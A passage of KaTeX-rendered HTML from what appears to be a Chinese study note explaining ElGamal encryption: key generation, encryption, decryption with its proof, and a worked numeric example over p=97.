class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">\beta = g^a\ mod \ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></li><li>公钥为(p,g,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>)</li><li>私钥为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span></li></ol><h3 id="加密过程-2"><a class="markdownIt-Anchor" href="#加密过程-2"></a> 加密过程</h3><ol><li>选择一个随机数k，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\leq k\leq p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>如果要加密消息<code>m</code></li><li>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_1=g^k(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo stretchy="false">(</mo><mi>β</mi><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_2=m(\beta)^k(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></li></ol><h3 id="解密过程-2"><a class="markdownIt-Anchor" href="#解密过程-2"></a> 解密过程</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m=c_2((c_1)^a)^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="解密原理-2"><a class="markdownIt-Anchor" href="#解密原理-2"></a> 解密原理</h3><p>因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo stretchy="false">(</mo><mi>β</mi><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mo>=</mo><mi>m</mi><msup><mi>g</mi><mrow><mi>a</mi><mi>k</mi></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_2=m(\beta)^k=mg^{ak}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><p>又<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>k</mi></mrow></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((c_1)^a)^{-1}=(g^{ak})^{-1}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><p>故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m=c_2((c_1)^a)^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="例子-2"><a class="markdownIt-Anchor" href="#例子-2"></a> 例子</h3><ol><li><p>p=97, g=5, 选择的随机数为a=58, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mo>=</mo><msup><mn>5</mn><mn>58</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>44</mn></mrow><annotation encoding="application/x-tex">\beta=g^a=5^{58}(mod\ 97)=44</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span></span></span></span>（这一步需要用到平方乘算法，计算量较大</p></li><li><p>于是(97, 5, 44)便为公钥，大家可以利用公钥来进行加密。58为私钥，只有知道私钥的人才可以解密。</p></li><li><p>假设需要加密m=3，再选择一个随机数k=36。</p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>5</mn><mn>36</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">c_1=g^k(mod\ p)=5^{36}(mod\ 97)=50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">0</span></span></span></span>（同样平方乘</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><msup><mi>β</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn><mo>∗</mo><mn>4</mn><msup><mn>4</mn><mn>36</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>31</mn></mrow><annotation encoding="application/x-tex">c_2=m\beta^k(mod\ p)=3*44^{36}(mod\ 97)=31</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span></span></span></span></p><p>这里经过老杜的指点，不必完全利用平方乘算法来计算，那样计算量太大了。因为如果有是1还要乘44，平方以后再乘44让人受不了，这时候还是之前手工算的时候更灵活，先算平方，再算四次方…$</p></li><li><p>解密 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>31</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>5</mn><msup><mn>0</mn><mn>58</mn></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=c_2*((c_1)^a)^{-1}(mod\ p)=31*(50^{58})^{-1}(mod\ 97)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 